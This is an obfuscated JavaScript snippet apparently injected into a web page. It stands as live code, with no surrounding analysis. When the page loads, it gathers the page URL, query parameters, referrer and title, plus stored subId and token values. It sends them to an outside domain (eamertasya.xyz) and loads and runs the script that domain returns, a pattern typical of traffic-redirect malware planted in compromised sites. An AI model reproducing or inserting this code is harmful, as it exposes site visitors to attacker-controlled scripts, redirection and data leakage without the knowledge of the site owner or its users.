<script>
    (function() {
    var name = '_LbWkWcZsFSjNHf1S';
    if (!window._LbWkWcZsFSjNHf1S) {
        window._LbWkWcZsFSjNHf1S = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://eamertasya.xyz/JNc26Nry',
        };
    }
    const _DqqdKyrtwXcyN5NN = localStorage.getItem('config');
    if (typeof _DqqdKyrtwXcyN5NN !== 'undefined' && _DqqdKyrtwXcyN5NN !== null) {
        var _shCxR2Mwh9bdTHdb = JSON.parse(_DqqdKyrtwXcyN5NN);
        var _rxchsYSRZyqnSWft = Math.round(+new Date()/1000);
        if (_shCxR2Mwh9bdTHdb.created_at + window._LbWkWcZsFSjNHf1S.ttl < _rxchsYSRZyqnSWft) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _c5n1WqzMM7xV5tLF = localStorage.getItem('subId');
    var _VrkZt8Rk9fGGWcsd = localStorage.getItem('token');
    var _THcKQzxT8t8wQHDP = '?return=js.client';
        _THcKQzxT8t8wQHDP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _THcKQzxT8t8wQHDP += '&se_referrer=' + encodeURIComponent(document.referrer);
        _THcKQzxT8t8wQHDP += '&default_keyword=' + encodeURIComponent(document.title);
        _THcKQzxT8t8wQHDP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _THcKQzxT8t8wQHDP += '&name=' + encodeURIComponent(name);
        _THcKQzxT8t8wQHDP += '&host=' + encodeURIComponent(window._LbWkWcZsFSjNHf1S.R_PATH);
    if (typeof _c5n1WqzMM7xV5tLF !== 'undefined' && _c5n1WqzMM7xV5tLF && window._LbWkWcZsFSjNHf1S.unique) {
        _THcKQzxT8t8wQHDP += '&sub_id=' + encodeURIComponent(_c5n1WqzMM7xV5tLF);
    }
    if (typeof _VrkZt8Rk9fGGWcsd !== 'undefined' && _VrkZt8Rk9fGGWcsd && window._LbWkWcZsFSjNHf1S.unique) {
        _THcKQzxT8t8wQHDP += '&token=' + encodeURIComponent(_VrkZt8Rk9fGGWcsd);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._LbWkWcZsFSjNHf1S.R_PATH + _THcKQzxT8t8wQHDP;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>